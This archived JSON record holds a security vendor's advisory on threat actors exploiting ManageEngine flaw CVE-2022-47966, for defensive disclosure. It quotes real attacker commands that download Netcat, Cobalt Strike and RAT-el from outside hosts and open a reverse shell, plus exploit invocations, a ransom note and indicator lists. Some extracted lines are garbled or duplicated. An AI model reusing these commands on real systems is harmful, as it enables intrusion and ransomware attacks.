{
    "id": "daffd792-5ccd-4668-a560-97844525ebfa",
    "created_at": "2023-03-03T02:06:31.143998Z",
    "updated_at": "2025-03-27T02:10:19.87427Z",
    "deleted_at": null,
    "sha1_hash": "80c22afb276200082babdf7c4a297e0286f0b693",
    "title": "2023-02-23 - Technical Advisory- Various Threat Actors Targeting ManageEngine Exploit CVE-2022-47966",
    "authors": "",
    "file_creation_date": "2023-03-01T09:38:05Z",
    "file_modification_date": "2023-03-01T09:38:05Z",
    "file_size": 910630,
    "plain_text": "# Technical Advisory: Various Threat Actors Targeting ManageEngine Exploit CVE-2022- 47966\n\n**businessinsights.bitdefender.com/tech-advisory-manageengine-cve-2022-47966**\n\nMartin Zugec\n\n[#Ransomware](https://businessinsights.bitdefender.com/topic/ransomware) [#Cybersecurity Awareness](https://businessinsights.bitdefender.com/topic/cybersecurity-awareness) [#featured](https://businessinsights.bitdefender.com/topic/featured)\nBy **[Martin Zugec\n/ Feb 23, 2023](https://businessinsights.bitdefender.com/author/martin-zugec)**\n\n\n-----\n\nSta t g o Ja ua y 0 0 3, [tde e de](https://www.bitdefender.com/blog/labs/) abs sta ted to ot ce a g oba c ease attac s us g t e a age g e e p o t C 0\n[47966. This Remote Code Execution (RCE) vulnerability (CVSSv3 critical score 9.8) allows full takeover of the compromised system by](https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator?name=CVE-2022-47966&vector=AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H&version=3.1&source=NIST)\n[unauthenticated threat actors. A total of 24 different products from Zoho ManageEngine are vulnerable.](https://www.manageengine.com/security/advisory/CVE/cve-2022-47966.html)\n\n[We started detecting first attacks immediately the next day after the first public Proof of Concept (PoC) was released and documented by](https://github.com/horizon3ai/CVE-2022-47966)\nHorizon3.ai team. The identified victims are located across the globe and are from various industries, as is common with opportunistic attacks.\nBased on our analysis, 2,000 to 4,000 servers accessible from the internet are running one of the vulnerable versions. Not all servers are\nexploitable with the current PoC code, because SAML needs to be configured, but we urge all businesses running these vulnerable versions to\npatch immediately. After analyzing data from our telemetry, we decided to release a technical advisory to warn the public about this latest wave\nof opportunistic attacks.\n\n_Fig 1 – Geographical distribution of attacks based on our analysis_\n\nAfter recent attacks targeting [Microsoft Exchange or](https://businessinsights.bitdefender.com/technical-advisory-proxyhell-exploit-chains-in-the-wild?hsLang=en-us) [ESXi servers, this is more proof that vulnerability exploits are becoming routine for various](https://businessinsights.bitdefender.com/technical-advisory-immediately-patch-your-vmware-esxi-servers-targeted-by-opportunistic-threat-actors?hsLang=en-us)\ngroups of threat actors. Using data from our telemetry, we have identified different groups of threat actors, including initial access brokers,\nransomware groups, and cyber espionage experts.\n\nIn this technical advisory, we describe the latest trend of opportunistic attacks, explain this particular vulnerability, and document four different\nclusters of attacks we have analyzed. We urge all ManageEngine customers to immediately locate and patch all vulnerable systems and be on\nhigh alert, as attacks are not decreasing.\n\nIn this technical advisory, we describe the latest trend of opportunistic attacks, explain this particular vulnerability, and document four different\nclusters of attacks we have analyzed. We urge all ManageEngine customers to immediately locate and patch all vulnerable systems and be on\nhigh alert, as attacks are not decreasing.\n\n## The “new” winning formula for threat actors\n\nThis latest wave of attacks are using similar a formula as we have observed previously with similar large-scale global attacks.\n\n1. Threat actors identify an RCE vulnerability (preferably with a public PoC example) that impacts as many companies as possible.\n\nExamples are [Microsoft Exchange,](https://businessinsights.bitdefender.com/technical-advisory-proxyhell-exploit-chains-in-the-wild?hsLang=en-us) [Apache, or](https://businessinsights.bitdefender.com/technical-advisory-zero-day-critical-vulnerability-in-log4j2-exploited-in-the-wild?hsLang=en-us) [VMware ESXi. Due to the sheer scale of global deployments, even if most companies](https://businessinsights.bitdefender.com/technical-advisory-immediately-patch-your-vmware-esxi-servers-targeted-by-opportunistic-threat-actors?hsLang=en-us)\npatch immediately, tens of thousands of vulnerable servers are available even years after patch is released.\n2. Using automated scanners, vulnerable systems are discovered and automatically compromised (spray-and-pray tactic).\n3. Using automated scanners, vulnerable systems are discovered and automatically compromised (spray-and-pray tactic).\n\nLess sophisticated attackers can automatically deploy ransomware – these are often disruptive and noisy campaigns that tend to get a lot of\npublic attention (for example recent ESXiArgs ransomware). However, the real danger comes from hybrid attacks that combine automated\ncompromise with more precise execution. Threat actors can patch the vulnerability (preventing their competitors from compromising the same\nsystem), perform assessment and decide what’s the best model of monetization.\n\n\n-----\n\n_Fig 2 – Flow of an example hybrid attack_\n\nEven if majority of businesses patch quickly, threat actors are left with thousands of potential targets. These vulnerable servers often belong to\nsmaller companies but can be used as a jump point for bigger and more lucrative targets. In many cases, your data (for stealing or encryption)\nare less valuable to threat actors than your business connections. When thinking of attack surface, we need to start including the whole supply\nchain, including small contractors and vendors. In this particular case, several products for Managed Service Providers (MSPs) are impacted,\nfurther increasing the risk of supply chain attacks that can affect multiple businesses.\n\nAnother factor that helps threat actors is that initial exploits are often derivative and behave similarly to the original PoC code with minimal\nmodifications. This lack of initial diversity is affecting both offensive and defensive measures. The impact of initial wave of attacks is mitigated,\nand temporary fixes and workarounds become permanent solutions. After the situation calms down, threat actors can find alternative methods\n[for exploitation and target systems that are considered “immune.” An example of this adaptation are recent ProxyNotShell/OWASSR attacks](https://businessinsights.bitdefender.com/technical-advisory-proxyhell-exploit-chains-in-the-wild?hsLang=en-us)\n[targeting Microsoft Exchange or virtual machine escape for OpenSLP vulnerability. VulnCheck already documented a different payload for](https://businessinsights.bitdefender.com/technical-advisory-immediately-patch-your-vmware-esxi-servers-targeted-by-opportunistic-threat-actors?hsLang=en-us)\nCVE-2022-47966 vulnerability, with great explanation how the lack of diversity is becoming a significant problem when dealing with exploits.\n\nThe current state is beneficial for all types of threat actors – initial access brokers have time to establish better foothold and offer premium\nservices (elevated privileges or victim information such as cyberinsurance coverage…), state-sponsored and profit-sharing groups like\n[Karakurt can exfiltrate data (read our deep dive into one of these operations), and more traditional Ransomware-as-a-Service groups can](https://www.cisa.gov/uscert/ncas/alerts/aa22-152a)\nprepare debilitating attacks at much bigger scale.\n\nConsidering all these factors, it is not surprising that our technical advisories in 2023 so far are based on vulnerabilities that were routinely\nexploited in 2021.\n\n## ManageEngine Vulnerability Overview\n\n[On January 10, 2023, ManageEngine released a security advisory CVE-2022-47966 affecting 24 products. This vulnerability was initially](https://www.manageengine.com/security/advisory/CVE/cve-2022-47966.html)\n[discovered by Khoa Dinh from VCSLab (read](https://twitter.com/_l0gg) [the original research). It allows unauthenticated remote code execution due to usage of an](https://blog.viettelcybersecurity.com/saml-show-stopper/)\noutdated third-party dependency for XML signature validation, Apache Santuario. The vulnerability in this library was identified almost 15 years\n[ago (March 2008).](https://bz.apache.org/bugzilla/show_bug.cgi?id=44629)\n\nThe vulnerable library is used only when SAML SSO is/was enabled. SAML is over 20 years old authentication standard and authentication\ntraffic is passed through the requesting client.\n\n\n-----\n\n_Fix 3 – Normal SAML authentication flow_\n\nThe modern authentication standards (like OpenID Connect) are not routing traffic through client, instead identity and service provider are\ncommunicating directly, bypassing the client completely.\n\nNormally, this should not be a concern. SAML is using XML format of data, and this data is digitally signed to prevent a client from modifying it\nbefore it is passed over to the service provider. Unfortunately, with the older version of XML library, the references validation is performed\nbefore the signature validation.\n\n_Fix 4 – with vulnerable library, references are validated before the signature validation_\n\nWhen processing an XML file, threat actors can use XML transformations to execute malicious code. XML transformation is the process of\nchanging the structure or format of an XML document to create a new XML document. The transformation can be achieved by using a set of\nrules or instructions, known as an XSLT (eXtensible Stylesheet Language Transformation), which specifies how the source XML should be\ntransformed into the target XML. Overall, XML transformation is a powerful tool that allows for the manipulation of XML data in a wide variety of\nways – including execution of code.\n\nBefore service provider can validate the signature and identify that SAML response has been modified, the code is already executed on a\ncompromised server. This code is executed under process <install directory>\\\\ManageEngine\\\\ServiceDesk\\\\jre\\\\bin\\\\java.exe.\n\n## Clusters of Attacks\n\nIn all analyzed cases, the aim of the attacks was to deploy tools on unpatched systems such as Netcat, Cobalt Strike beacon, RAT-el (opensource penetration testing tool) and others by using built-in tools like certutil.exe, bitsadmin.exe, powershell.exe, or curl.exe.\n\nAmong the cases, we have identified four main clusters of attack types and information are provided in sections below. Aside from these four\nclusters, we have identified a wide range of attacks that couldn’t be clustered.\n\n\n-----\n\n### C uste t a ccess o e s\n\nAfter initial compromise, the attack continued with the following commands:\n\nCommand Lines\n```\n certutil.exe -urlcache -f http://80.85.156[.]184:8085/cn.exe C:\\cn.exe\n powershell C:\\cn.exe -e cmd.exe 80.85.156[.]184 443\nCN.exe was identified as a Netcat – command-line tool that is often used as a backdoor. Further analyzing our telemetry, we have identified\n\n```\nfollowing files to be present on the same IP address and port.\n\nFile Name MD5 Hash Description\n\n`AnyDesk.exe` 9a1d9fe9b1223273c314632d04008384 Legitimate AnyDesk installer\n\n`cf.exe` b777226ef93acdb168980bbca82a48fe DarkComet communicating with 80.85.156[.]184:1456\n\n`cg.exe` 8da896375e5d33e7d7486dbf71d008d8 DarkComet communicating with 80.85.154[.]180:1456\n\n`cl.exe` 5c0227204548c5a768c2e11da02ff774 DarkComet communicating with 80.85.154[.]180:1456\n\n`cn.exe` e0fb946c00b140693e3cf5de258c22a1 Netcat\n\n`CVE-2022-47966.py` 6e3b1169aac82b4d0e8ea0a24d1477d5 PoC from Horizon3.ai\n\n`go.bat` e2c644343fad304ccde047f3301066ba\n\n`rdp.ps1` 9758c592ef4b9a2279f8e80e992248b6 Enable RDP on port 8094\n\n`reverse.elf` 199cb4936f7ef64fa134eb3cefff0518 Reverse shell communicating with 80.85.156[.]184\n\n`reverse.exe` 988038d8407d510c905183b8f6c421d6 Reverse shell communicating with 80.85.156[.]184\n\n`reverse_bind.exe` edac597788e7c3df14a5fdcd13ee8916\n\nThe threat actors used multiple scripts to automate their operation. These scripts (ip<number>.sh) used following syntax to test if a target is\nvulnerable to CVE-2022-47966:\n\nCommand Lines\n\npython CVE-2022-47966.py --url https://<target ip address>:443/SamlResponseServlet --command 'powershell echo ASDFGH >\nC:\\Progra~1\\ManageEngine\\ServiceDesk\\webapps\\ROOT\\images\\a.txt'\n```\n python CVE-2022-47966.py --url https://<target ip address>:8181/SamlResponseServlet --command 'powershell echo ASDFGH\n > C:\\Progra~1\\ManageEngine\\ServiceDesk\\webapps\\ROOT\\images\\a.txt'\n\n```\nThe aim of these attacks was to install AnyDesk software for remote access.\n\n### Cluster 2 – Buhti Ransomware\n\nThe threat actors attempted to download any.bat to install AnyDesk software and tried to execute a ransomware payload for Buhti\n[Ransomware. This is a new ransomware family – while we have seen previous reports of Linux ransomware written in Go language, our](https://twitter.com/Unit42_Intel/status/1626258145868763137)\nsample was a Windows PE executable (383b0d0dda2d7557b5cca518f53256b9).\n\n\n-----\n\ns a so a e sa p e s cu e t y detected u de a e `a so` `u t` `389` `C` e a e e t acted t e o o g a so ote o\nthe encryptor:\n\n----------- [ Welcome to buhtiRansom ] ------------->\n\nWhat happend?\n\n---------------------------------------------\nYour files are encrypted. We use strong encryption algorithms, so you cannot decrypt your data.\n\nBut you can restore everything by purchasing a special program from us - universal decryptor. This program will restore all your files.\n\nFollow our instructions below and you will recover all your data.\n\nWhat guarantees?\n\n---------------------------------------------\nWe value our reputation. If we do not do our work and liabilities, nobody will pay us. This is not in our interests.\n\nAll our decryption software is perfectly tested and will decrypt your data.\n\nHow to get access?\n\n---------------------------------------------\nUsing a browser:\n\n1) Open website: https://satoshidisk[.]com/pay/CHTWpW\n\n2) Enter valid email to receive download link after payment.\n\n3) Pay amount to Bitcoin address.\n\n4) Receive email link to the download page.\n\n5) Decrypt instruction included.\n\n!!! DANGER !!!\n\nDO NOT MODIFY or try to RECOVER any files yourself. It WILL NOT be able to RESTORE.\n\n!!! DANGER !!!\n\n\n-----\n\n_Fig 5 – Screenshot of the payment site used by Buhti ransomware_\n\n### Cluster 3 – Cobalt Strike and RAT-el\n\nThreat actors tried to download malicious software using bitsadmin.exe and curl.exe tools from 212.192.246[.]232 server. The analysis of\n[the hosted files shows that Cobalt Strike and RAT-el red teaming tools were intended to be deployed.](https://github.com/FrenchCisco/RATel)\n\nCommand Line MD5 Description Detection Name\n\n```\n\"bitsadmin /transfer admin3 /download\n/priority high\nhttp://212.192.246[.]232/home/svchost.ps1\nC:\\\\users\\\\public\\\\music\\\\svchost.ps1\"\nbitsadmin /transfer admin3 /download\n/priority high\nhttp://212.192.246[.]232/temp/conhost.exe\nC:\\\\users\\\\public\\\\music\\\\conhost.exe\n\n```\n```\ne3cff253b9ad9050eb57d957624b796e\n53deb494057bb8e5d72b0f53bab1cb44\n\n```\n\nCobalt Strike beacon with C2\n```\n0xx1.kaspenskyupdates[.]com\n\n```\nRAT-el communicates with C2\n```\n135.181.121[.]232\n\n```\n```\nHeur.BZC.Leopa\nHeur.BZC.Leopa\n\n```\n\n-----\n\n```\n curl\n http://212.192.246[.]232/temp/conhost.exe\n -o c:\\\\windows\\\\temp\\\\conhost.exe\n\n### Cluster 4 – Cyber espionage\n\n```\n```\n53deb494057bb8e5d72b0f53bab1cb44\n\n```\n```\nGeneric.Backdo\n\n```\n\nOne cluster included evidence of targeted espionage operation – we decided to write a separate, more detailed report about this operation.\n[You can read more about it in Weaponizing PoCs – A targeted attack using CVE-2022-47966 research from Bitdefender Labs.](https://bitdefender.com/blog/labs/weaponizing-pocs-a-targeted-attack-using-cve-2022-47966)\n\n## Conclusion & Recommendations\n\nThis vulnerability is another clear reminder of the importance of keeping systems up to date with the latest security patches while also\nemploying strong perimeter defense. Attackers don't need to scour for new exploits or novel techniques when they know that many\n[organizations are vulnerable to older exploits due, in part, to the lack of proper patch management and](https://www.bitdefender.com/content/dam/bitdefender/resources/technical-brief/Bitdefender-Patch-Management-Technical-Brief-en.pdf) [risk management.](https://www.bitdefender.com/content/dam/bitdefender/resources/technical-brief/Bitdefender-Risk-Management-Technical-Brief-en.pdf)\n\nIn addition to prevention and cyber hygiene, multi-layered protection on all endpoints, servers, and workloads is critical. In our telemetry, we\nhave identified the following indicators of compromise detected by different endpoint security modules:\n\nImplementing IP, domain, and URL reputation is one of the most effective methods of defeating automated vulnerability exploits. According to\n[analysis in the Data Breach Investigations Report 2022, only 0.4% of the IPs that attempted RCE were not seen in a previous attack. Blocking](https://www.verizon.com/business/resources/reports/dbir/)\nbad IPs, domains, or URLs on all devices, including remote and work-from-home endpoints, can be highly effective.\n\nFinally, companies of all sizes should implement detection and response capabilities to detect any suspicious activity on the network and\nminimize the dwell time of adversaries. The GravityZone XDR sensors detect suspicious activity on the server or virtual machine, and alert\nsecurity teams to lateral movement attempts or the establishment of an external connection by the threat actor. This technology can be\n[augmented by good security operations, either in-house or through a managed service like Bitdefender MDR.](https://www.youtube.com/watch?v=TRp7uLYLGiQ)\n\nUltimately, it is important to keep in mind the best protection against modern cyber-attacks is a multi-layered defense-in-depth architecture.\nBitdefender GravityZone covers this by delivering prevention, protection, and detection and response in a single solution.\n\n_We would like to thank Victor Vrabie, Cristina Vatamanu, and Alexandru Maximciuc for help with putting this advisory report together._\n\n## Indicators of Compromise\n\nAn up-to-date and complete list of indicators of compromise is available to Bitdefender Threat Intelligence users. The currently known indicators\nof compromise can be found in the table below.\n\n### URLs\n\nhttp://80.85.156[.]184:8085/cn.exe\n\nhttps://tmpfiles[.]org/dl/788858/any.txt\n\nhttps://tmpfiles[.]org/dl/765036/enc.txt\n\nhttp://212.192.246[.]232/home/svchost.ps1\n\nhttp://212.192.246[.]232/temp/conhost.exe\n\nhttp://111.68.7[.]122:8081/svhost.exe\n\nhttp://146.70.126[.]178:57228/shell.exe\n\nhttp://185.163.45[.]86:8000/1.txt\n\nhttp://79.141.162[.]36:8888/aaaa.txt\n\n\n-----\n\nhttp://143.244.153[.]229:8090\n\nhttp://160.20.147[.]145:8000/favicon.ico\n\nhttp://104.223.35[.]221/dashboard.html\n\nhttp://146.4.21[.]94/tmp/tmp/logs.php\n\nhttp://146.4.21[.]94/tmp/tmp/comp.dat\n\nhttp://45.146.7[.]20:8000/nc.exe\n\nhttp://149.28.57[.]130:443/Import.reg\n\nhttp://149.28.57[.]130:443/time.bat\n\nhttp://149.28.57[.]130:443/bdredline\n\nhttp://45.154.14[.]194:443/conhost.txt\n\nhttp://45.154.14[.]194:443/K7AVWScn.exe\n\nhttp://45.154.14[.]194:443/conhost.exe\n\nhttp://45.154.14[.]194:8080/conhost.exe\n\nhttp://45.154.14[.]194:443/K7AVWScn.pfx\n\nhttp://45.154.14[.]194:443/K7AVWScn.dll\n\nhttp://45.154.14[.]194:443/K7AVWScn.txt\n\nhttp://45.154.14[.]194:443/msftedit.dll\n\nhttp://45.154.14[.]194:443/OLE.PDB\n\nhttp://45.154.14[.]194:443/cmd.txt\n\nhttp://45.154.14[.]194:443/MainFilterInitializer.jar\n\nhttp://45.154.14[.]194:443/Import.reg\n\nhttp://45.154.14[.]194:443/time.bat\n\n### Files\n\nb777226ef93acdb168980bbca82a48fe\n\n8da896375e5d33e7d7486dbf71d008d8\n\n5c0227204548c5a768c2e11da02ff774\n\ne0fb946c00b140693e3cf5de258c22a1\n\n\n-----\n\n9758c592ef4b9a2279f8e80e992248b6\n\n199cb4936f7ef64fa134eb3cefff0518\n\n988038d8407d510c905183b8f6c421d6\n\nedac597788e7c3df14a5fdcd13ee8916\n\n383b0d0dda2d7557b5cca518f53256b9\n\ne3cff253b9ad9050eb57d957624b796e\n\n53deb494057bb8e5d72b0f53bab1cb44\n\n527c71c523d275c8367b67bbebf48e9f\n\n61e82cae3c97887e4b367e507c4995ed\n\nc027d641c4c1e9d9ad048cda2af85db6\n\n4960591cc04b080827020393f21c405b\n\nbfe79b11ee1b82ae95b14fd53b6c3fd3\n\n### IP Addresses\n\n45.154.14[.]194\n\n149.28.57[.]130\n\n78.141.247[.]105\n\n80.85.156[.]184\n\n135.181.121[.]232\n\n45.146.7[.]20\n\n5.255.107[.]19\n\n139.99.118[.]61\n\n212.192.246[.]232\n\n111.68.7[.]122\n\n146.70.126[.]178\n\n185.163.45[.]86\n\n79.141.162[.]36\n\n143.244.153[.]229\n\n\n-----\n\n160.20.147[.]145\n\n104.223.35[.]221\n\n146.4.21[.]94\n\n### Domains\n\n0xx1.kaspenskyupdates[.]com\n\nicy51j1b6sbewpauivxwfrmcu30vok.oastify[.]com\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2023/2023-02-23 - Technical Advisory- Various Threat Actors Targeting ManageEngine Exploit CVE-2022-47966.pdf"
    ],
    "report_names": [
        "2023-02-23 - Technical Advisory- Various Threat Actors Targeting ManageEngine Exploit CVE-2022-47966.pdf"
    ],
    "threat_actors": [
        {
            "id": "6ad410c7-e291-4327-a54b-281c23f0d4fa",
            "created_at": "2022-10-25T16:07:24.501468Z",
            "updated_at": "2025-03-27T02:02:10.26052Z",
            "deleted_at": null,
            "main_name": "Karakurt",
            "aliases": [],
            "source_name": "ETDA:Karakurt",
            "tools": [
                "7-Zip",
                "Agentemis",
                "AnyDesk",
                "Cobalt Strike",
                "CobaltStrike",
                "FileZilla",
                "LOLBAS",
                "LOLBins",
                "Living off the Land",
                "Mimikatz",
                "WinZip",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "2af9bea3-b43e-4a6d-8dc6-46dad6e3ff24",
            "created_at": "2022-10-25T16:47:55.853415Z",
            "updated_at": "2025-03-27T02:05:17.401138Z",
            "deleted_at": null,
            "main_name": "GOLD TOMAHAWK",
            "aliases": [
                "Karakurt Lair",
                "Karakurt Team",
                "Karakurt"
            ],
            "source_name": "Secureworks:GOLD TOMAHAWK",
            "tools": [
                " AnyDesk",
                " MEGA",
                " QuickPacket",
                " Rclone",
                " SendGB",
                "7-ZIP"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "610a7295-3139-4f34-8cec-b3da40add480",
            "created_at": "2023-01-06T13:46:38.608142Z",
            "updated_at": "2025-03-27T02:00:02.87217Z",
            "deleted_at": null,
            "main_name": "Cobalt",
            "aliases": [
                "Cobalt Gang",
                "GOLD KINGSWOOD",
                "COBALT SPIDER",
                "G0080",
                "Mule Libra",
                "Cobalt Group"
            ],
            "source_name": "MISPGALAXY:Cobalt",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "079e3d6e-24ef-42b0-b555-75c288f9efd8",
            "created_at": "2023-03-04T02:01:54.105946Z",
            "updated_at": "2025-03-27T02:00:03.122936Z",
            "deleted_at": null,
            "main_name": "Karakurt",
            "aliases": [
                "Karakurt Lair"
            ],
            "source_name": "MISPGALAXY:Karakurt",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
    "ts_created_at": 1677809191,
    "ts_updated_at": 1743041419,
    "ts_creation_date": 1677663485,
    "ts_modification_date": 1677663485,
    "files": {
        "pdf": "https://archive.orkl.eu/80c22afb276200082babdf7c4a297e0286f0b693.pdf",
        "text": "https://archive.orkl.eu/80c22afb276200082babdf7c4a297e0286f0b693.txt",
        "img": "https://archive.orkl.eu/80c22afb276200082babdf7c4a297e0286f0b693.jpg"
    }
}